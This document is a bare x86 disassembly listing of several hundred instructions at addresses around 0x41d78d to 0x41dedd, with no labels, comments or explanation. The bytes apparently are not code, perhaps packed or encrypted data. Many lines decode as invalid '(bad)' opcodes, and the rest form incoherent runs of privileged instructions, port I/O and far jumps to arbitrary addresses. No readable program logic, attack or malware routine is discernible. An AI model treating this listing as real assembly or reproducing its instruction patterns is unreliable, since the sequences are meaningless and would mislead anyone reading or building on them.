  41d78d:	jmp    0x1350ad4f
  41d792:	out    dx,al
  41d793:	inc    edx
  41d794:	jnp    0x41d7a9
  41d796:	xor    BYTE PTR [edi-0x54e74e0],0x96
  41d79d:	push   es
  41d79e:	rol    DWORD PTR [esi-0x51486f26],0xaa
  41d7a5:	cmp    BYTE PTR [eax-0xb467a57],0x82
  41d7ac:	aaa    
  41d7ad:	(bad)  [eax-0x750c4f72]
  41d7b3:	sub    al,0x78
  41d7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7b6:	fwait
  41d7b7:	into   
  41d7b8:	shl    DWORD PTR [ecx-0x76],0x3f
  41d7bc:	inc    esp
  41d7bd:	or     eax,0xdb1781c5
  41d7c2:	mov    ebp,0x5cfcd222
  41d7c7:	pushf  
  41d7c8:	mov    ?,WORD PTR [ebx+0x60]
  41d7cb:	xor    DWORD PTR [eax-0x4a],ebp
  41d7ce:	iret   
  41d7cf:	sbb    eax,0x7d5e296f
  41d7d4:	cmp    esp,DWORD PTR [eax-0x65]
  41d7d7:	addr16 loope 0x41d7f4
  41d7da:	push   esi
  41d7db:	ficom  DWORD PTR [ecx-0x45a2c34c]
  41d7e1:	cs cmp ch,ch
  41d7e4:	pop    ss
  41d7e5:	adc    dl,bl
  41d7e7:	dec    ebp
  41d7e8:	lods   al,BYTE PTR ds:[esi]
  41d7e9:	dec    esp
  41d7ea:	jae    0x41d842
  41d7ec:	in     al,0x4e
  41d7ee:	imul   esi,esp,0x1d1015e7
  41d7f4:	dec    edx
  41d7f5:	fs mov ebx,0xb3b8e81d
  41d7fb:	mov    al,ds:0x2fcca15a
  41d800:	cmp    BYTE PTR [ebx+0x35ca05c5],ah
  41d806:	push   ss
  41d807:	jp     0x41d7ef
  41d809:	pavgb  mm1,QWORD PTR [edi-0x241fe4d7]
  41d810:	in     eax,dx
  41d811:	xor    eax,0x60389044
  41d816:	push   ds
  41d817:	add    BYTE PTR [eax],dl
  41d819:	dec    eax
  41d81a:	inc    ebx
  41d81b:	iret   
  41d81c:	ss push esi
  41d81e:	cli    
  41d81f:	test   BYTE PTR [eax],al
  41d821:	in     al,dx
  41d822:	add    eax,0x8979dbbe
  41d827:	(bad)  
  41d828:	(bad)  
  41d829:	repz dec esi
  41d82b:	xchg   esp,eax
  41d82c:	cli    
  41d82d:	std    
  41d82e:	or     eax,0xfa97b2d
  41d833:	xchg   BYTE PTR [esi+0x7472babe],al
  41d839:	adc    esp,DWORD PTR [ecx]
  41d83b:	pop    eax
  41d83c:	sub    DWORD PTR es:[ebp-0x1b],ebp
  41d840:	pop    ss
  41d841:	fist   WORD PTR [edx+0x7d]
  41d844:	inc    ebp
  41d845:	sub    al,0x47
  41d847:	xchg   edi,eax
  41d848:	dec    edi
  41d849:	jb     0x41d84f
  41d84b:	sub    al,0x11
  41d84d:	jle    0x41d843
  41d84f:	mov    dh,BYTE PTR [ecx+0x13]
  41d852:	xchg   esp,eax
  41d853:	xor    DWORD PTR [ebp-0x55],edi
  41d856:	sbb    eax,0xa06a09dd
  41d85b:	fld    TBYTE PTR ds:0xf3378c75
  41d861:	aaa    
  41d862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d863:	pushf  
  41d864:	lea    esp,[ebx+0x3a]
  41d867:	aas    
  41d868:	ins    DWORD PTR es:[edi],dx
  41d869:	lea    edi,[ecx]
  41d86b:	call   0xa1da00d6
  41d870:	fdivr  DWORD PTR [edx]
  41d872:	or     eax,0x591b7764
  41d877:	loopne 0x41d8da
  41d879:	mov    ebx,0x2080b18
  41d87e:	sub    ebx,DWORD PTR [eax]
  41d880:	pusha  
  41d881:	inc    ebp
  41d882:	jno    0x41d87d
  41d884:	ins    BYTE PTR es:[edi],dx
  41d885:	cmp    BYTE PTR [ebx-0x72],ah
  41d888:	jnp    0x41d86c
  41d88a:	jns    0x41d87d
  41d88c:	and    eax,DWORD PTR [esi+0x7c]
  41d88f:	xchg   edx,eax
  41d890:	mov    ah,0x9a
  41d892:	ins    DWORD PTR es:[edi],dx
  41d893:	inc    ecx
  41d894:	mov    dh,0x91
  41d896:	jmp    0xbf02:0xf2fbecd9
  41d89d:	rcr    edi,cl
  41d89f:	out    dx,eax
  41d8a0:	(bad)  
  41d8a2:	xor    DWORD PTR [eax],esp
  41d8a4:	ja     0x41d91d
  41d8a6:	sbb    al,0xc5
  41d8a8:	sar    BYTE PTR [ebx+0x69c1cd55],cl
  41d8ae:	iret   
  41d8af:	push   ebp
  41d8b0:	xchg   BYTE PTR [eax],al
  41d8b2:	mov    bl,0x5f
  41d8b4:	shl    BYTE PTR ds:0xb052121e,0x6e
  41d8bb:	scas   eax,DWORD PTR es:[edi]
  41d8bc:	stc    
  41d8bd:	in     eax,0xc
  41d8bf:	xchg   dl,bh
  41d8c1:	addr16 mov ch,0xe
  41d8c4:	shr    BYTE PTR [ebp-0x4c],0xc0
  41d8c8:	add    ch,BYTE PTR [edi-0x51]
  41d8cb:	add    ecx,eax
  41d8cd:	xchg   esp,eax
  41d8ce:	adc    al,0x30
  41d8d0:	inc    ebx
  41d8d1:	dec    esi
  41d8d2:	daa    
  41d8d3:	cmp    ebx,esp
  41d8d5:	daa    
  41d8d6:	or     al,0x97
  41d8d8:	sbb    al,0xa6
  41d8da:	xor    BYTE PTR [esi+0x3c],0x38
  41d8de:	in     al,0xdb
  41d8e0:	push   0xffffffbe
  41d8e2:	sub    al,0xdc
  41d8e4:	cdq    
  41d8e5:	loopne 0x41d94e
  41d8e7:	mov    eax,ds:0xf012c624
  41d8ec:	mov    bl,0x5b
  41d8ee:	jae    0x41d95e
  41d8f0:	repnz les esi,FWORD PTR [edx]
  41d8f3:	inc    edx
  41d8f4:	and    al,0x27
  41d8f6:	mov    ds:0xd2bd38c3,al
  41d8fb:	cmp    eax,0x2eae1cb5
  41d900:	aam    0x56
  41d902:	push   esp
  41d903:	rcl    eax,0x7e
  41d906:	rcr    esp,0x80
  41d909:	scas   al,BYTE PTR es:[edi]
  41d90a:	lock lock adc BYTE PTR [edi],al
  41d90e:	call   0xc195:0x711af460
  41d915:	imul   esi,DWORD PTR [edx],0x24
  41d918:	enter  0xd8dd,0x71
  41d91c:	loop   0x41d97d
  41d91e:	mov    al,ds:0xaac21062
  41d923:	in     al,0xef
  41d925:	fsub   st,st(0)
  41d927:	test   eax,eax
  41d929:	stos   DWORD PTR es:[edi],eax
  41d92a:	add    DWORD PTR [eax],edx
  41d92c:	xchg   esi,eax
  41d92d:	es jne 0x41d934
  41d930:	or     esp,DWORD PTR [esi-0x53]
  41d933:	cli    
  41d934:	in     eax,dx
  41d935:	cwde   
  41d936:	test   eax,0x614ee8ee
  41d93b:	push   ds
  41d93c:	sbb    cl,BYTE PTR [edi+0x3d84e34]
  41d942:	mov    bl,0xd8
  41d944:	sub    al,0xa1
  41d946:	out    dx,al
  41d947:	jnp    0x41d8ec
  41d949:	fldcw  WORD PTR [edi-0x2c]
  41d94c:	mov    BYTE PTR [ecx],dh
  41d94e:	and    dl,BYTE PTR [edi-0x28]
  41d951:	push   esi
  41d952:	dec    eax
  41d953:	lds    eax,FWORD PTR [ebp+0x35]
  41d956:	inc    edi
  41d957:	jecxz  0x41d946
  41d959:	ins    BYTE PTR es:[edi],dx
  41d95a:	jmp    0xf1d37f2e
  41d95f:	sub    DWORD PTR [edx+0x728d600e],ebx
  41d965:	cmp    eax,0x1b14414b
  41d96a:	mov    eax,ds:0x9957c9cf
  41d96f:	xchg   ebx,eax
  41d970:	cld    
  41d971:	cmc    
  41d972:	popa   
  41d973:	test   edi,0x1986a9be
  41d979:	fcom   DWORD PTR [eax-0x1123dec6]
  41d97f:	(bad)  
  41d980:	jg     0x41d92a
  41d982:	(bad)  
  41d984:	xlat   BYTE PTR ds:[ebx]
  41d985:	ins    DWORD PTR es:[edi],dx
  41d986:	popa   
  41d987:	jmp    0xc89c:0x3415b591
  41d98e:	pop    ecx
  41d98f:	sbb    DWORD PTR [esp+ebp*1+0x22],eax
  41d993:	aad    0xc8
  41d995:	out    dx,al
  41d996:	(bad)  
  41d997:	ror    DWORD PTR [ebp-0x41],1
  41d99a:	cs test esi,eax
  41d99d:	mov    BYTE PTR [ebp-0x72],cl
  41d9a0:	sbb    ebx,esi
  41d9a2:	fldenv [ebx]
  41d9a4:	sbb    al,0xd6
  41d9a6:	xor    BYTE PTR ds:0x8c44233c,al
  41d9ac:	in     al,dx
  41d9ad:	cld    
  41d9ae:	addr16 out dx,eax
  41d9b0:	push   edi
  41d9b1:	mov    dh,0xcf
  41d9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9b4:	push   es
  41d9b5:	jmp    0x5e0ff5e6
  41d9ba:	or     eax,0x61d0a7d0
  41d9bf:	adc    DWORD PTR [eax-0x6b],0xffffffe1
  41d9c3:	cmp    DWORD PTR [ecx-0x26],ebx
  41d9c6:	mov    gs,WORD PTR [ebx]
  41d9c8:	mov    ds:0xf9b565d7,al
  41d9cd:	retf   0x2e78
  41d9d0:	lahf   
  41d9d1:	ins    DWORD PTR es:[edi],dx
  41d9d2:	cwde   
  41d9d3:	sbb    DWORD PTR [ebp-0x7d],0xffffffa4
  41d9d7:	cmp    al,0xe2
  41d9d9:	imul   edx,eax,0x2d172ba8
  41d9df:	ins    DWORD PTR es:[edi],dx
  41d9e0:	daa    
  41d9e1:	push   0x3e4b776f
  41d9e6:	xor    eax,0xb48cc899
  41d9eb:	loopne 0x41da36
  41d9ed:	inc    ebp
  41d9ee:	add    eax,0x7d378198
  41d9f3:	(bad)  
  41d9f4:	adc    al,0x3a
  41d9f6:	inc    edi
  41d9f7:	rcl    DWORD PTR [ebp+0x4fb0b12d],0xcb
  41d9fe:	mov    ebx,0x1c1348eb
  41da03:	adc    eax,ebx
  41da05:	fmul   QWORD PTR [esi-0x534746e4]
  41da0b:	in     al,dx
  41da0c:	das    
  41da0d:	pop    esp
  41da0e:	in     eax,dx
  41da0f:	lds    ebp,FWORD PTR [edi]
  41da11:	dec    eax
  41da12:	push   esp
  41da13:	cmp    eax,0x46f6803f
  41da18:	adc    eax,0x216cca64
  41da1d:	pop    ebp
  41da1e:	or     BYTE PTR gs:[edi+eax*8+0x63dc6ee6],bl
  41da26:	cmc    
  41da27:	push   eax
  41da28:	outs   dx,DWORD PTR ds:[esi]
  41da29:	cwde   
  41da2a:	adc    eax,0xc08b0475
  41da2f:	lds    edx,FWORD PTR [ebx-0x2]
  41da32:	(bad)  
  41da33:	add    ch,BYTE PTR [edi]
  41da35:	imul   edx,DWORD PTR [edx],0x28
  41da38:	jnp    0x41da98
  41da3a:	jae    0x41da5c
  41da3c:	and    eax,0x34d10da2
  41da41:	mov    esi,0x266d74b
  41da46:	push   es
  41da47:	and    DWORD PTR [edi+0x6e0bcae3],ebp
  41da4d:	mov    ds:0x913c4790,al
  41da52:	daa    
  41da53:	jg     0x41da64
  41da55:	adc    esp,DWORD PTR [ebp+0x38712587]
  41da5b:	inc    esi
  41da5c:	scas   al,BYTE PTR es:[edi]
  41da5d:	dec    edx
  41da5e:	jmp    0x41da19
  41da60:	mov    ds:0x7fca6c6c,eax
  41da65:	sub    BYTE PTR [edx],0xd9
  41da68:	inc    eax
  41da69:	jg     0x41daab
  41da6b:	xor    eax,0x88761c81
  41da70:	cmp    dl,BYTE PTR [edi]
  41da72:	pop    ebp
  41da73:	cli    
  41da74:	pop    ebp
  41da75:	add    eax,0xe753de69
  41da7a:	nop
  41da7b:	loope  0x41da52
  41da7d:	fiadd  DWORD PTR [ebx]
  41da7f:	data16 je 0x41daa7
  41da82:	jge    0x41daae
  41da84:	std    
  41da85:	loopne 0x41da24
  41da87:	lock xor al,0x82
  41da8a:	push   edi
  41da8b:	xchg   ebp,eax
  41da8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da8d:	sti    
  41da8e:	mov    al,0xf2
  41da90:	test   DWORD PTR [esi+0x3b],ebp
  41da93:	aas    
  41da94:	in     eax,0xc0
  41da96:	sbb    DWORD PTR [edx-0x8],ebp
  41da99:	stc    
  41da9a:	pop    ds
  41da9b:	add    cl,0x90
  41da9e:	push   ecx
  41da9f:	sbb    eax,0xaa50671f
  41daa4:	mov    ebx,DWORD PTR [esi+0x39fa5a29]
  41daaa:	aad    0x7b
  41daac:	fidivr DWORD PTR [eax]
  41daae:	add    eax,0x6ba9fde0
  41dab3:	push   esi
  41dab4:	mov    BYTE PTR [esi+edx*8],0xab
  41dab8:	jbe    0x41da6a
  41daba:	scas   al,BYTE PTR es:[edi]
  41dabb:	jo     0x41dab2
  41dabd:	sub    BYTE PTR [esi+0x22cc7c66],ch
  41dac3:	test   DWORD PTR [edx+0xf],0xeba13c85
  41daca:	mov    al,0xe3
  41dacc:	rcl    BYTE PTR [eax-0x3c],0x53
  41dad0:	mov    al,0x2e
  41dad2:	inc    eax
  41dad3:	add    ch,dl
  41dad5:	pushf  
  41dad6:	pop    ebx
  41dad7:	cmp    esp,DWORD PTR [esi+ebx*2]
  41dada:	cmc    
  41dadb:	out    dx,al
  41dadc:	or     edx,DWORD PTR [ecx+edi*8+0x6d]
  41dae0:	xchg   ebx,eax
  41dae1:	fwait
  41dae2:	pop    esp
  41dae3:	cwde   
  41dae4:	test   eax,0xd67bf5de
  41dae9:	add    eax,esp
  41daeb:	test   eax,0xc7fe4ec2
  41daf0:	cli    
  41daf1:	out    0x2d,al
  41daf3:	or     eax,0xc8f52ec3
  41daf8:	cli    
  41daf9:	shl    dl,cl
  41dafb:	lods   al,BYTE PTR ds:[esi]
  41dafc:	xor    al,0x2a
  41dafe:	xchg   ebx,eax
  41daff:	mov    ch,BYTE PTR [edi]
  41db01:	dec    ebx
  41db02:	xchg   ecx,eax
  41db03:	pop    esp
  41db04:	add    al,0x81
  41db06:	rcr    DWORD PTR [esi-0x2727b45],cl
  41db0c:	push   edx
  41db0d:	mov    edi,0x99734f4d
  41db12:	dec    esi
  41db13:	leave  
  41db14:	mov    eax,es
  41db16:	cli    
  41db17:	mov    eax,ds:0x2863484f
  41db1c:	sbb    al,0xb4
  41db1e:	mov    esi,DWORD PTR [esi+0x4f60df4e]
  41db24:	sbb    BYTE PTR [ebx+0x17],cl
  41db27:	pop    es
  41db28:	std    
  41db29:	in     eax,dx
  41db2a:	mov    eax,ds:0xc4afac8b
  41db2f:	inc    ebp
  41db30:	scas   al,BYTE PTR es:[edi]
  41db31:	xor    DWORD PTR [edi-0xc7eeca5],eax
  41db37:	fld    st(5)
  41db39:	aam    0x17
  41db3b:	and    dl,BYTE PTR [ebx+ebp*8]
  41db3e:	jo     0x41daf5
  41db40:	sub    al,ah
  41db42:	adc    eax,0x518d7c88
  41db47:	test   eax,0xb0cf3848
  41db4c:	ins    DWORD PTR es:[edi],dx
  41db4d:	imul   DWORD PTR [ebp-0x6b86e5dc]
  41db53:	enter  0x8c82,0xce
  41db57:	sub    al,0xca
  41db59:	sub    esp,DWORD PTR [esi]
  41db5b:	mov    eax,0xf2616752
  41db60:	scas   al,BYTE PTR es:[edi]
  41db61:	push   0x1d2777a3
  41db66:	popa   
  41db67:	jecxz  0x41db7c
  41db69:	xor    BYTE PTR [ebx],bl
  41db6b:	or     eax,0xb75dd563
  41db70:	add    DWORD PTR [edi+0x73],esp
  41db73:	in     al,0x6f
  41db75:	cli    
  41db76:	sbb    BYTE PTR ds:0x79c62846,bh
  41db7c:	or     al,0x77
  41db7e:	jnp    0x41dbf9
  41db80:	leave  
  41db81:	add    eax,0x5a86ccef
  41db86:	les    edx,FWORD PTR [esp+ebp*1-0x7c342490]
  41db8d:	mov    eax,ds:0x6401753
  41db92:	outs   dx,DWORD PTR ds:[esi]
  41db93:	pushf  
  41db94:	stos   BYTE PTR es:[edi],al
  41db95:	xchg   esp,eax
  41db96:	ss sbb al,0xfa
  41db99:	sbb    dl,ch
  41db9b:	mov    bl,BYTE PTR [ebx]
  41db9d:	dec    edi
  41db9e:	mov    ah,0x64
  41dba0:	daa    
  41dba1:	and    cl,al
  41dba3:	sbb    bh,al
  41dba5:	pop    eax
  41dba6:	into   
  41dba7:	push   ebp
  41dba8:	sbb    ebp,DWORD PTR [edi-0x1b]
  41dbab:	adc    DWORD PTR [ebx],esi
  41dbad:	lds    esp,FWORD PTR [ebx]
  41dbaf:	sub    al,0xec
  41dbb1:	loope  0x41dbcf
  41dbb3:	push   0xffffffdd
  41dbb5:	sub    BYTE PTR [ebx],dh
  41dbb7:	xchg   ebp,eax
  41dbb8:	adc    al,0x23
  41dbba:	sti    
  41dbbb:	pop    ebx
  41dbbc:	cmp    dh,0xc8
  41dbbf:	pop    ebp
  41dbc0:	adc    dh,BYTE PTR [edi+eax*2]
  41dbc3:	xchg   edi,eax
  41dbc4:	pop    esp
  41dbc5:	shr    DWORD PTR [esi],cl
  41dbc7:	adc    al,bh
  41dbc9:	pop    ebx
  41dbca:	dec    ebp
  41dbcb:	mov    ah,0x33
  41dbcd:	enter  0xd797,0xef
  41dbd1:	cli    
  41dbd2:	int    0x29
  41dbd4:	xor    eax,0x1a366de4
  41dbd9:	xor    esp,edi
  41dbdb:	ins    DWORD PTR es:[edi],dx
  41dbdc:	lock pop ds
  41dbde:	loopne 0x41dbdd
  41dbe0:	int3   
  41dbe1:	(bad)  
  41dbe2:	sub    DWORD PTR [edx+0x73],edx
  41dbe5:	leave  
  41dbe6:	pop    ebx
  41dbe7:	jecxz  0x41dbc1
  41dbe9:	and    BYTE PTR [edx+0x25],bh
  41dbec:	in     eax,0x46
  41dbee:	mov    ds:0xfdee89ae,al
  41dbf3:	dec    ebp
  41dbf4:	mov    bh,BYTE PTR [eax]
  41dbf6:	jl     0x41dc28
  41dbf8:	aam    0x51
  41dbfa:	mov    ebp,0x6272b44c
  41dbff:	(bad)  
  41dc00:	mov    ds:0xf7b06b16,al
  41dc05:	or     eax,0x51158629
  41dc0a:	seto   BYTE PTR [ecx]
  41dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc0e:	sbb    edi,DWORD PTR [ecx+0x17]
  41dc11:	jne    0x41dbae
  41dc13:	adc    eax,0x2e15cc37
  41dc18:	jnp    0x41dc1d
  41dc1a:	inc    eax
  41dc1b:	mov    ds:0xdd09fa8,eax
  41dc20:	(bad)  
  41dc22:	scas   al,BYTE PTR es:[edi]
  41dc23:	aaa    
  41dc24:	daa    
  41dc25:	adc    DWORD PTR [esi],esp
  41dc27:	ins    BYTE PTR es:[edi],dx
  41dc28:	lea    eax,[edx+ecx*4]
  41dc2b:	(bad)  
  41dc2c:	repz xchg ebp,eax
  41dc2e:	mov    dh,0xa4
  41dc30:	push   0xba6e984e
  41dc35:	and    BYTE PTR [esi],al
  41dc37:	js     0x41dc8e
  41dc39:	nop
  41dc3a:	add    ebx,DWORD PTR [edi-0x5b8d3965]
  41dc40:	arpl   WORD PTR [ecx],bx
  41dc42:	xor    ebx,ecx
  41dc44:	sub    esp,DWORD PTR [ecx+0x56f5a13c]
  41dc4a:	mov    eax,fs:0xa10837e5
  41dc50:	xchg   esi,eax
  41dc51:	mov    dl,0x49
  41dc53:	push   ds
  41dc54:	leave  
  41dc55:	test   al,0x12
  41dc57:	das    
  41dc58:	test   ebx,edx
  41dc5a:	imul   ebx,DWORD PTR [ebx+ebp*1],0xfa7849bf
  41dc61:	sub    ebp,ecx
  41dc63:	(bad)  
  41dc64:	push   ss
  41dc65:	js     0x41dc5e
  41dc67:	and    esp,DWORD PTR [esi]
  41dc69:	lods   al,BYTE PTR ds:[esi]
  41dc6a:	add    edx,ebp
  41dc6c:	or     al,0xce
  41dc6e:	jnp    0x41dcdc
  41dc70:	dec    esi
  41dc71:	fstp   TBYTE PTR [esi-0x68]
  41dc74:	inc    ebx
  41dc75:	in     eax,0xec
  41dc77:	bnd call 0xd575c497
  41dc7d:	in     eax,0xc2
  41dc7f:	push   ebp
  41dc80:	jnp    0x41dc46
  41dc82:	cmc    
  41dc83:	int3   
  41dc84:	retf   0xc21c
  41dc87:	push   edi
  41dc88:	(bad)  
  41dc89:	xor    BYTE PTR [ebp-0x4975b2c3],ah
  41dc8f:	pop    esp
  41dc90:	mov    WORD PTR [esi],cs
  41dc92:	mov    edi,0x6fe97335
  41dc97:	jmp    0x41dca5
  41dc99:	xchg   ecx,eax
  41dc9a:	cli    
  41dc9b:	hlt    
  41dc9c:	xchg   ecx,eax
  41dc9d:	call   0xfa6f8193
  41dca2:	adc    al,0x74
  41dca4:	add    al,0x87
  41dca6:	(bad)  
  41dca7:	retf   
  41dca8:	rcr    eax,cl
  41dcaa:	dec    edi
  41dcab:	dec    edx
  41dcac:	js     0x41dd02
  41dcae:	inc    esi
  41dcaf:	std    
  41dcb0:	fbld   TBYTE PTR [ebx]
  41dcb2:	cld    
  41dcb3:	push   ecx
  41dcb4:	repnz (bad) 
  41dcb6:	push   0xe6cfc8f3
  41dcbb:	mov    bh,0x9e
  41dcbd:	mov    ebx,ebx
  41dcbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcc0:	je     0x41dc8a
  41dcc2:	test   eax,0x27b6444a
  41dcc7:	ja     0x41dc49
  41dcc9:	dec    eax
  41dcca:	test   DWORD PTR [ebx],eax
  41dccc:	rcl    BYTE PTR [ebx+0x5a008c21],0x2a
  41dcd3:	xor    ah,bl
  41dcd5:	pop    ds
  41dcd6:	clc    
  41dcd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcd8:	rcr    DWORD PTR [ebx],0xc9
  41dcdb:	cmp    BYTE PTR [edi],dh
  41dcdd:	xor    al,BYTE PTR [eax]
  41dcdf:	out    0x3a,eax
  41dce1:	arpl   WORD PTR [edx+0x1d],bp
  41dce4:	pop    ecx
  41dce5:	sbb    DWORD PTR [ebp-0x17],esp
  41dce8:	in     al,dx
  41dce9:	push   ss
  41dcea:	add    esi,DWORD PTR fs:[edx+0x4e1bcc1e]
  41dcf1:	pop    esi
  41dcf2:	scas   al,BYTE PTR es:[edi]
  41dcf3:	lds    edx,FWORD PTR [edx]
  41dcf5:	dec    edi
  41dcf6:	jmp    0x784a3221
  41dcfb:	dec    eax
  41dcfc:	sbb    cl,al
  41dcfe:	test   eax,0x36681632
  41dd03:	in     al,0x9d
  41dd05:	mov    cx,0xf2f5
  41dd09:	dec    edx
  41dd0a:	lods   al,BYTE PTR ds:[esi]
  41dd0b:	xchg   ebp,eax
  41dd0c:	mov    dh,0x5
  41dd0e:	xor    bl,BYTE PTR [eax+0x23ada7c6]
  41dd14:	mov    ds:0x34f07466,al
  41dd19:	or     al,0xd8
  41dd1b:	push   es
  41dd1c:	popf   
  41dd1d:	adc    BYTE PTR [esi+0x5],bh
  41dd20:	fisub  DWORD PTR [ebx-0x39]
  41dd23:	push   ebp
  41dd24:	into   
  41dd25:	push   cs
  41dd26:	or     bl,BYTE PTR [ecx-0x4af31aa1]
  41dd2c:	cmp    edx,eax
  41dd2e:	xchg   ebx,eax
  41dd2f:	or     cl,BYTE PTR [ebx-0x7b14f592]
  41dd35:	pusha  
  41dd36:	sub    DWORD PTR [ebx+ebx*2-0xd],edi
  41dd3a:	sbb    DWORD PTR [ebx+0x63ec1c11],edi
  41dd40:	sbb    DWORD PTR [ecx+0x1a566de9],esi
  41dd46:	test   al,0xa6
  41dd48:	push   ebx
  41dd49:	lea    edi,[edi-0xae76058]
  41dd4f:	(bad)  
  41dd50:	pop    ebp
  41dd51:	adc    al,0x40
  41dd53:	inc    esp
  41dd54:	push   0x7
  41dd56:	jp     0x41dd0c
  41dd58:	aaa    
  41dd59:	and    eax,0xea28fe01
  41dd5e:	pop    edi
  41dd5f:	cli    
  41dd60:	loop   0x41dd48
  41dd62:	mov    esp,DWORD PTR [ebx]
  41dd64:	or     al,0xc2
  41dd66:	sbb    BYTE PTR [ebx],ch
  41dd68:	out    dx,al
  41dd69:	outs   dx,DWORD PTR ds:[esi]
  41dd6a:	jle    0x41dd60
  41dd6c:	mov    al,ds:0x49c1f6fa
  41dd71:	mov    eax,esi
  41dd73:	mov    cl,0x8b
  41dd75:	in     eax,dx
  41dd76:	adc    BYTE PTR [eax],dl
  41dd78:	jl     0x41ddf0
  41dd7a:	sar    DWORD PTR [edi-0x2],0xdf
  41dd7e:	jp     0x41ddf6
  41dd80:	sbb    BYTE PTR [edi-0x3],dl
  41dd83:	adc    al,0xa1
  41dd85:	pop    eax
  41dd86:	adc    DWORD PTR [edi+0x201f1de1],0x646a80c
  41dd90:	leave  
  41dd91:	xchg   eax,ebx
  41dd93:	xchg   edi,eax
  41dd94:	cwde   
  41dd95:	push   eax
  41dd96:	popa   
  41dd97:	push   cs
  41dd98:	add    eax,0xeae1a3c1
  41dd9d:	(bad)  
  41dd9e:	adc    dh,BYTE PTR [ecx-0x4]
  41dda1:	push   ebp
  41dda2:	jecxz  0x41dd66
  41dda4:	pop    es
  41dda5:	mov    edi,0x82be6828
  41ddaa:	out    0x29,al
  41ddac:	or     BYTE PTR ds:0x9d5417e2,dh
  41ddb2:	div    edx
  41ddb4:	xor    esp,ebx
  41ddb6:	xor    eax,0x16cbed9b
  41ddbb:	dec    edx
  41ddbc:	icebp  
  41ddbd:	outs   dx,BYTE PTR ds:[esi]
  41ddbe:	sbb    DWORD PTR [esi+0x2ea6acc2],esp
  41ddc4:	xor    BYTE PTR [ebx-0x618e796a],0xd2
  41ddcb:	pop    ecx
  41ddcc:	inc    edi
  41ddcd:	ss mov esi,0x320cda9
  41ddd3:	scas   eax,DWORD PTR es:[edi]
  41ddd4:	aas    
  41ddd5:	lahf   
  41ddd6:	(bad)  
  41ddd7:	bswap  edi
  41ddd9:	ss xor edi,0x1ee71ba1
  41dde0:	nop
  41dde1:	inc    edi
  41dde2:	hlt    
  41dde3:	test   DWORD PTR [ecx+0x21],ebx
  41dde6:	adc    al,0x86
  41dde8:	xlat   BYTE PTR ds:[ebx]
  41dde9:	mov    al,0xe
  41ddeb:	mov    WORD PTR [eax+eax*8-0x44],?
  41ddef:	jge    0x41de2f
  41ddf1:	jl     0x41dd83
  41ddf3:	sahf   
  41ddf4:	les    ecx,FWORD PTR [edi-0x4a]
  41ddf7:	mov    ah,0x1e
  41ddf9:	ins    DWORD PTR es:[edi],dx
  41ddfa:	jg     0x41de40
  41ddfc:	std    
  41ddfd:	in     al,dx
  41ddfe:	inc    eax
  41ddff:	(bad)  
  41de00:	sti    
  41de01:	je     0x41dd92
  41de03:	(bad)  
  41de04:	cli    
  41de05:	jecxz  0x41ddc6
  41de07:	push   esi
  41de08:	xor    esp,ebp
  41de0a:	ror    DWORD PTR [ebp-0x77],0xd0
  41de0e:	and    ecx,edx
  41de10:	js     0x41de1d
  41de12:	dec    esp
  41de13:	(bad)  
  41de14:	aaa    
  41de15:	(bad)  
  41de16:	cmp    eax,0xdd89636b
  41de1b:	ds (bad) 
  41de1d:	xor    esi,DWORD PTR [edi+0x4d]
  41de20:	mov    ebx,0x63f584b4
  41de25:	mov    dl,0xd
  41de27:	mov    dh,dh
  41de29:	repnz stc 
  41de2b:	call   0xc660bf9c
  41de30:	dec    ebp
  41de31:	jecxz  0x41de80
  41de33:	push   eax
  41de34:	stos   BYTE PTR es:[edi],al
  41de35:	add    DWORD PTR [eax+0x1104d451],edi
  41de3b:	ror    ecx,1
  41de3d:	rcl    BYTE PTR [edx-0x56],0x66
  41de41:	mov    cl,0x3e
  41de43:	or     BYTE PTR [esi],dh
  41de45:	loope  0x41de6b
  41de47:	shl    bl,0x7f
  41de4a:	lods   al,BYTE PTR ds:[esi]
  41de4b:	or     DWORD PTR [ecx+eiz*2-0x5abbfcef],ecx
  41de52:	add    al,0xff
  41de54:	lea    edx,[ebx+0x6]
  41de57:	and    BYTE PTR [esi],ch
  41de59:	adc    dh,cl
  41de5b:	inc    eax
  41de5c:	ins    BYTE PTR es:[edi],dx
  41de5d:	je     0x41de5e
  41de5f:	jbe    0x41deba
  41de61:	inc    edx
  41de62:	add    DWORD PTR ds:[ebp-0x3eeaeb07],esi
  41de69:	xlat   BYTE PTR gs:[ebx]
  41de6b:	mov    ah,0x5e
  41de6d:	inc    eax
  41de6e:	fdivr  QWORD PTR [esi+0x12e0c255]
  41de74:	pop    esp
  41de75:	xor    BYTE PTR [ecx+eax*1-0x62],bh
  41de79:	and    DWORD PTR [esi],edx
  41de7b:	rol    BYTE PTR [edi+0x298e17ba],0x21
  41de82:	mov    ah,0xe6
  41de84:	pop    eax
  41de85:	xchg   esp,eax
  41de86:	ds adc dl,al
  41de89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de8a:	xor    ah,al
  41de8c:	rcl    BYTE PTR [ebp+ebp*8-0x3e],1
  41de90:	sbb    BYTE PTR [ecx],bl
  41de92:	dec    edi
  41de93:	add    DWORD PTR [ebx+0x14],esp
  41de96:	fs jns 0x41dec1
  41de99:	cmp    eax,DWORD PTR [edi*1-0x47f702e9]
  41dea0:	sub    ah,cl
  41dea2:	sub    al,0x0
  41dea4:	xor    dh,dh
  41dea6:	pushf  
  41dea7:	(bad)  
  41dea8:	sahf   
  41dea9:	add    eax,0xa2744893
  41deae:	ret    0x4409
  41deb1:	mov    al,ds:0x372222a2
  41deb6:	pop    eax
  41deb7:	add    al,0xee
  41deb9:	scas   al,BYTE PTR es:[edi]
  41deba:	scas   al,BYTE PTR es:[edi]
  41debb:	and    al,0x4
  41debd:	jmp    0x2c4c:0x8eb8711d
  41dec4:	adc    dl,BYTE PTR [ebp+0x5118bf0]
  41deca:	test   al,0xb8
  41decc:	icebp  
  41decd:	mov    dh,0x98
  41decf:	mov    dl,0x3
  41ded1:	mov    ds:0x186f572,al
  41ded6:	ja     0x41de58
  41ded8:	cmp    eax,0x411a0b5f
  41dedd:	pop    ebp
